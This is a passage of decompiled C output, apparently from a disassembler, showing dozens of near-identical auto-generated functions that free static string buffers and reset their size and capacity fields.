      v0 = (_BYTE *)*((_DWORD *)dword_4F90E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F90E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F90F8 = 0;
  dword_4F90FC = 15;
  LOBYTE(dword_4F90E8) = 0;
}
// 4F90F8: using guessed type int dword_4F90F8;
// 4F90FC: using guessed type int dword_4F90FC;

//----- (00488580) --------------------------------------------------------
void __cdecl sub_488580()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F915C >= 0x10 )
  {
    v0 = dword_4F9148;
    if ( (unsigned int)(dword_4F915C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9148 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9148 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9158 = 0;
  dword_4F915C = 15;
  LOBYTE(dword_4F9148) = 0;
}
// 4F9158: using guessed type int dword_4F9158;
// 4F915C: using guessed type int dword_4F915C;

//----- (004885E0) --------------------------------------------------------
void __cdecl sub_4885E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F91D4 >= 0x10 )
  {
    v0 = dword_4F91C0;
    if ( (unsigned int)(dword_4F91D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F91C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F91C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F91D0 = 0;
  dword_4F91D4 = 15;
  LOBYTE(dword_4F91C0) = 0;
}
// 4F91D0: using guessed type int dword_4F91D0;
// 4F91D4: using guessed type int dword_4F91D4;

//----- (00488640) --------------------------------------------------------
void __cdecl sub_488640()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F91A4 >= 0x10 )
  {
    v0 = dword_4F9190;
    if ( (unsigned int)(dword_4F91A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9190 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9190 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F91A0 = 0;
  dword_4F91A4 = 15;
  LOBYTE(dword_4F9190) = 0;
}
// 4F91A0: using guessed type int dword_4F91A0;
// 4F91A4: using guessed type int dword_4F91A4;

//----- (004886A0) --------------------------------------------------------
void __cdecl sub_4886A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F900C >= 0x10 )
  {
    v0 = dword_4F8FF8;
    if ( (unsigned int)(dword_4F900C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8FF8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8FF8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9008 = 0;
  dword_4F900C = 15;
  LOBYTE(dword_4F8FF8) = 0;
}
// 4F9008: using guessed type int dword_4F9008;
// 4F900C: using guessed type int dword_4F900C;

//----- (00488700) --------------------------------------------------------
void __cdecl sub_488700()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8ED4 >= 0x10 )
  {
    v0 = dword_4F8EC0;
    if ( (unsigned int)(dword_4F8ED4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8EC0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8EC0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8ED0 = 0;
  dword_4F8ED4 = 15;
  LOBYTE(dword_4F8EC0) = 0;
}
// 4F8ED0: using guessed type int dword_4F8ED0;
// 4F8ED4: using guessed type int dword_4F8ED4;

//----- (00488760) --------------------------------------------------------
void __cdecl sub_488760()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F34 >= 0x10 )
  {
    v0 = dword_4F8F20;
    if ( (unsigned int)(dword_4F8F34 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F20 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F20 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F30 = 0;
  dword_4F8F34 = 15;
  LOBYTE(dword_4F8F20) = 0;
}
// 4F8F30: using guessed type int dword_4F8F30;
// 4F8F34: using guessed type int dword_4F8F34;

//----- (004887C0) --------------------------------------------------------
void __cdecl sub_4887C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F92DC >= 0x10 )
  {
    v0 = dword_4F92C8;
    if ( (unsigned int)(dword_4F92DC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F92C8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F92C8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F92D8 = 0;
  dword_4F92DC = 15;
  LOBYTE(dword_4F92C8) = 0;
}
// 4F92D8: using guessed type int dword_4F92D8;
// 4F92DC: using guessed type int dword_4F92DC;

//----- (00488820) --------------------------------------------------------
void __cdecl sub_488820()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F92C4 >= 0x10 )
  {
    v0 = dword_4F92B0;
    if ( (unsigned int)(dword_4F92C4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F92B0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F92B0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F92C0 = 0;
  dword_4F92C4 = 15;
  LOBYTE(dword_4F92B0) = 0;
}
// 4F92C0: using guessed type int dword_4F92C0;
// 4F92C4: using guessed type int dword_4F92C4;

//----- (00488880) --------------------------------------------------------
void __cdecl sub_488880()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F04 >= 0x10 )
  {
    v0 = dword_4F8EF0;
    if ( (unsigned int)(dword_4F8F04 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8EF0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8EF0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F00 = 0;
  dword_4F8F04 = 15;
  LOBYTE(dword_4F8EF0) = 0;
}
// 4F8F00: using guessed type int dword_4F8F00;
// 4F8F04: using guessed type int dword_4F8F04;

//----- (004888E0) --------------------------------------------------------
void __cdecl sub_4888E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F90CC >= 0x10 )
  {
    v0 = dword_4F90B8;
    if ( (unsigned int)(dword_4F90CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F90B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F90B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F90C8 = 0;
  dword_4F90CC = 15;
  LOBYTE(dword_4F90B8) = 0;
}
// 4F90C8: using guessed type int dword_4F90C8;
// 4F90CC: using guessed type int dword_4F90CC;

//----- (00488940) --------------------------------------------------------
void __cdecl sub_488940()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8EEC >= 0x10 )
  {
    v0 = dword_4F8ED8;
    if ( (unsigned int)(dword_4F8EEC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8ED8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8ED8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8EE8 = 0;
  dword_4F8EEC = 15;
  LOBYTE(dword_4F8ED8) = 0;
}
// 4F8EE8: using guessed type int dword_4F8EE8;
// 4F8EEC: using guessed type int dword_4F8EEC;

//----- (004889A0) --------------------------------------------------------
void __cdecl sub_4889A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9264 >= 0x10 )
  {
    v0 = dword_4F9250;
    if ( (unsigned int)(dword_4F9264 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9250 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9250 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9260 = 0;
  dword_4F9264 = 15;
  LOBYTE(dword_4F9250) = 0;
}
// 4F9260: using guessed type int dword_4F9260;
// 4F9264: using guessed type int dword_4F9264;

//----- (00488A00) --------------------------------------------------------
void __cdecl sub_488A00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F4C >= 0x10 )
  {
    v0 = dword_4F8F38;
    if ( (unsigned int)(dword_4F8F4C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F38 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F38 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F48 = 0;
  dword_4F8F4C = 15;
  LOBYTE(dword_4F8F38) = 0;
}
// 4F8F48: using guessed type int dword_4F8F48;
// 4F8F4C: using guessed type int dword_4F8F4C;

//----- (00488A60) --------------------------------------------------------
void __cdecl sub_488A60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8FC4 >= 0x10 )
  {
    v0 = dword_4F8FB0;
    if ( (unsigned int)(dword_4F8FC4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8FB0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8FB0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8FC0 = 0;
  dword_4F8FC4 = 15;
  LOBYTE(dword_4F8FB0) = 0;
}
// 4F8FC0: using guessed type int dword_4F8FC0;
// 4F8FC4: using guessed type int dword_4F8FC4;

//----- (00488AC0) --------------------------------------------------------
void __cdecl sub_488AC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8FF4 >= 0x10 )
  {
    v0 = dword_4F8FE0;
    if ( (unsigned int)(dword_4F8FF4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8FE0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8FE0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8FF0 = 0;
  dword_4F8FF4 = 15;
  LOBYTE(dword_4F8FE0) = 0;
}
// 4F8FF0: using guessed type int dword_4F8FF0;
// 4F8FF4: using guessed type int dword_4F8FF4;

//----- (00488B20) --------------------------------------------------------
void __cdecl sub_488B20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F94 >= 0x10 )
  {
    v0 = dword_4F8F80;
    if ( (unsigned int)(dword_4F8F94 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F80 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F80 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F90 = 0;
  dword_4F8F94 = 15;
  LOBYTE(dword_4F8F80) = 0;
}
// 4F8F90: using guessed type int dword_4F8F90;
// 4F8F94: using guessed type int dword_4F8F94;

//----- (00488B80) --------------------------------------------------------
void __cdecl sub_488B80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F92F4 >= 0x10 )
  {
    v0 = dword_4F92E0;
    if ( (unsigned int)(dword_4F92F4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F92E0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F92E0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F92F0 = 0;
  dword_4F92F4 = 15;
  LOBYTE(dword_4F92E0) = 0;
}
// 4F92F0: using guessed type int dword_4F92F0;
// 4F92F4: using guessed type int dword_4F92F4;

//----- (00488BE0) --------------------------------------------------------
void __cdecl sub_488BE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8FDC >= 0x10 )
  {
    v0 = dword_4F8FC8;
    if ( (unsigned int)(dword_4F8FDC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8FC8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8FC8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8FD8 = 0;
  dword_4F8FDC = 15;
  LOBYTE(dword_4F8FC8) = 0;
}
// 4F8FD8: using guessed type int dword_4F8FD8;
// 4F8FDC: using guessed type int dword_4F8FDC;

//----- (00488C40) --------------------------------------------------------
void __cdecl sub_488C40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8FAC >= 0x10 )
  {
    v0 = dword_4F8F98;
    if ( (unsigned int)(dword_4F8FAC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F98 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F98 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8FA8 = 0;
  dword_4F8FAC = 15;
  LOBYTE(dword_4F8F98) = 0;
}
// 4F8FA8: using guessed type int dword_4F8FA8;
// 4F8FAC: using guessed type int dword_4F8FAC;

//----- (00488CA0) --------------------------------------------------------
void __cdecl sub_488CA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8EBC >= 0x10 )
  {
    v0 = dword_4F8EA8;
    if ( (unsigned int)(dword_4F8EBC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8EA8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8EA8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8EB8 = 0;
  dword_4F8EBC = 15;
  LOBYTE(dword_4F8EA8) = 0;
}
// 4F8EB8: using guessed type int dword_4F8EB8;
// 4F8EBC: using guessed type int dword_4F8EBC;

//----- (00488D00) --------------------------------------------------------
void __cdecl sub_488D00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9324 >= 0x10 )
  {
    v0 = dword_4F9310;
    if ( (unsigned int)(dword_4F9324 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9310 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9310 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9320 = 0;
  dword_4F9324 = 15;
  LOBYTE(dword_4F9310) = 0;
}
// 4F9320: using guessed type int dword_4F9320;
// 4F9324: using guessed type int dword_4F9324;

//----- (00488D60) --------------------------------------------------------
void __cdecl sub_488D60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F918C >= 0x10 )
  {
    v0 = dword_4F9178;
    if ( (unsigned int)(dword_4F918C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9178 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9178 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9188 = 0;
  dword_4F918C = 15;
  LOBYTE(dword_4F9178) = 0;
}
// 4F9188: using guessed type int dword_4F9188;
// 4F918C: using guessed type int dword_4F918C;

//----- (00488DC0) --------------------------------------------------------
void __cdecl sub_488DC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F927C >= 0x10 )
  {
    v0 = dword_4F9268;
    if ( (unsigned int)(dword_4F927C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9268 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9268 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9278 = 0;
  dword_4F927C = 15;
  LOBYTE(dword_4F9268) = 0;
}
// 4F9278: using guessed type int dword_4F9278;
// 4F927C: using guessed type int dword_4F927C;

//----- (00488E20) --------------------------------------------------------
void __cdecl sub_488E20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9114 >= 0x10 )
  {
    v0 = dword_4F9100;
    if ( (unsigned int)(dword_4F9114 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9100 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9100 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9110 = 0;
  dword_4F9114 = 15;
  LOBYTE(dword_4F9100) = 0;
}
// 4F9110: using guessed type int dword_4F9110;
// 4F9114: using guessed type int dword_4F9114;

//----- (00488E80) --------------------------------------------------------
void __cdecl sub_488E80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9204 >= 0x10 )
  {
    v0 = dword_4F91F0;
    if ( (unsigned int)(dword_4F9204 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F91F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F91F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9200 = 0;
  dword_4F9204 = 15;
  LOBYTE(dword_4F91F0) = 0;
}
// 4F9200: using guessed type int dword_4F9200;
// 4F9204: using guessed type int dword_4F9204;

//----- (00488EE0) --------------------------------------------------------
void __cdecl sub_488EE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F903C >= 0x10 )
  {
    v0 = dword_4F9028;
    if ( (unsigned int)(dword_4F903C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9028 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9028 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9038 = 0;
  dword_4F903C = 15;
  LOBYTE(dword_4F9028) = 0;
}
// 4F9038: using guessed type int dword_4F9038;
// 4F903C: using guessed type int dword_4F903C;

//----- (00488F40) --------------------------------------------------------
void __cdecl sub_488F40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9054 >= 0x10 )
  {
    v0 = dword_4F9040;
    if ( (unsigned int)(dword_4F9054 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9040 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9040 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9050 = 0;
  dword_4F9054 = 15;
  LOBYTE(dword_4F9040) = 0;
}
// 4F9050: using guessed type int dword_4F9050;
// 4F9054: using guessed type int dword_4F9054;

//----- (00488FA0) --------------------------------------------------------
void __cdecl sub_488FA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F92AC >= 0x10 )
  {
    v0 = dword_4F9298;
    if ( (unsigned int)(dword_4F92AC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9298 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9298 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F92A8 = 0;
  dword_4F92AC = 15;
  LOBYTE(dword_4F9298) = 0;
}
// 4F92A8: using guessed type int dword_4F92A8;
// 4F92AC: using guessed type int dword_4F92AC;

//----- (00489000) --------------------------------------------------------
void __cdecl sub_489000()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F924C >= 0x10 )
  {
    v0 = dword_4F9238;
    if ( (unsigned int)(dword_4F924C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9238 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9238 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9248 = 0;
  dword_4F924C = 15;
  LOBYTE(dword_4F9238) = 0;
}
// 4F9248: using guessed type int dword_4F9248;
// 4F924C: using guessed type int dword_4F924C;

//----- (00489060) --------------------------------------------------------
void __cdecl sub_489060()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F1C >= 0x10 )
  {
    v0 = dword_4F8F08;
    if ( (unsigned int)(dword_4F8F1C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F08 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F08 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F18 = 0;
  dword_4F8F1C = 15;
  LOBYTE(dword_4F8F08) = 0;
}
// 4F8F18: using guessed type int dword_4F8F18;
// 4F8F1C: using guessed type int dword_4F8F1C;

//----- (004890C0) --------------------------------------------------------
void __cdecl sub_4890C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9174 >= 0x10 )
  {
    v0 = dword_4F9160;
    if ( (unsigned int)(dword_4F9174 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9160 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9160 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9170 = 0;
  dword_4F9174 = 15;
  LOBYTE(dword_4F9160) = 0;
}
// 4F9170: using guessed type int dword_4F9170;
// 4F9174: using guessed type int dword_4F9174;

//----- (00489120) --------------------------------------------------------
void __cdecl sub_489120()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F912C >= 0x10 )
  {
    v0 = dword_4F9118;
    if ( (unsigned int)(dword_4F912C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9118 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9118 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9128 = 0;
  dword_4F912C = 15;
  LOBYTE(dword_4F9118) = 0;
}
// 4F9128: using guessed type int dword_4F9128;
// 4F912C: using guessed type int dword_4F912C;

//----- (00489180) --------------------------------------------------------
void __cdecl sub_489180()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F933C >= 0x10 )
  {
    v0 = dword_4F9328;
    if ( (unsigned int)(dword_4F933C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9328 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9328 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9338 = 0;
  dword_4F933C = 15;
  LOBYTE(dword_4F9328) = 0;
}
// 4F9338: using guessed type int dword_4F9338;
// 4F933C: using guessed type int dword_4F933C;

//----- (004891E0) --------------------------------------------------------
void __cdecl sub_4891E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9684 >= 0x10 )
  {
    v0 = dword_4F9670;
    if ( (unsigned int)(dword_4F9684 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9670 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9670 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9680 = 0;
  dword_4F9684 = 15;
  LOBYTE(dword_4F9670) = 0;
}
// 4F9680: using guessed type int dword_4F9680;
// 4F9684: using guessed type int dword_4F9684;

//----- (00489240) --------------------------------------------------------
void __cdecl sub_489240()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F94BC >= 0x10 )
  {
    v0 = dword_4F94A8;
    if ( (unsigned int)(dword_4F94BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F94A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F94A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F94B8 = 0;
  dword_4F94BC = 15;
  LOBYTE(dword_4F94A8) = 0;
}
// 4F94B8: using guessed type int dword_4F94B8;
// 4F94BC: using guessed type int dword_4F94BC;

//----- (004892A0) --------------------------------------------------------
void __cdecl sub_4892A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F93FC >= 0x10 )
  {
    v0 = dword_4F93E8;
    if ( (unsigned int)(dword_4F93FC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F93E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F93E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F93F8 = 0;
  dword_4F93FC = 15;
  LOBYTE(dword_4F93E8) = 0;
}
// 4F93F8: using guessed type int dword_4F93F8;
// 4F93FC: using guessed type int dword_4F93FC;

//----- (00489300) --------------------------------------------------------
void __cdecl sub_489300()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F957C >= 0x10 )
  {
    v0 = dword_4F9568;
    if ( (unsigned int)(dword_4F957C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9568 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9568 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9578 = 0;
  dword_4F957C = 15;
  LOBYTE(dword_4F9568) = 0;
}
// 4F9578: using guessed type int dword_4F9578;
// 4F957C: using guessed type int dword_4F957C;

//----- (00489360) --------------------------------------------------------
void __cdecl sub_489360()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F96CC >= 0x10 )
  {
    v0 = dword_4F96B8;
    if ( (unsigned int)(dword_4F96CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F96B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F96B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F96C8 = 0;
  dword_4F96CC = 15;
  LOBYTE(dword_4F96B8) = 0;
}
// 4F96C8: using guessed type int dword_4F96C8;
// 4F96CC: using guessed type int dword_4F96CC;

//----- (004893C0) --------------------------------------------------------
void __cdecl sub_4893C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9504 >= 0x10 )
  {
    v0 = dword_4F94F0;
    if ( (unsigned int)(dword_4F9504 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F94F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F94F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9500 = 0;
  dword_4F9504 = 15;
  LOBYTE(dword_4F94F0) = 0;
}
// 4F9500: using guessed type int dword_4F9500;
// 4F9504: using guessed type int dword_4F9504;

//----- (00489420) --------------------------------------------------------
void __cdecl sub_489420()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F96B4 >= 0x10 )
  {
    v0 = dword_4F96A0;
    if ( (unsigned int)(dword_4F96B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F96A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F96A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F96B0 = 0;
  dword_4F96B4 = 15;
  LOBYTE(dword_4F96A0) = 0;
}
// 4F96B0: using guessed type int dword_4F96B0;
// 4F96B4: using guessed type int dword_4F96B4;

//----- (00489480) --------------------------------------------------------
void __cdecl sub_489480()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F951C >= 0x10 )
  {
    v0 = dword_4F9508;
    if ( (unsigned int)(dword_4F951C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9508 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9508 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9518 = 0;
  dword_4F951C = 15;
  LOBYTE(dword_4F9508) = 0;
}
// 4F9518: using guessed type int dword_4F9518;
// 4F951C: using guessed type int dword_4F951C;

//----- (004894E0) --------------------------------------------------------
void __cdecl sub_4894E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F972C >= 0x10 )
  {
    v0 = dword_4F9718;
    if ( (unsigned int)(dword_4F972C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9718 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9718 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9728 = 0;
  dword_4F972C = 15;
  LOBYTE(dword_4F9718) = 0;
}
// 4F9728: using guessed type int dword_4F9728;
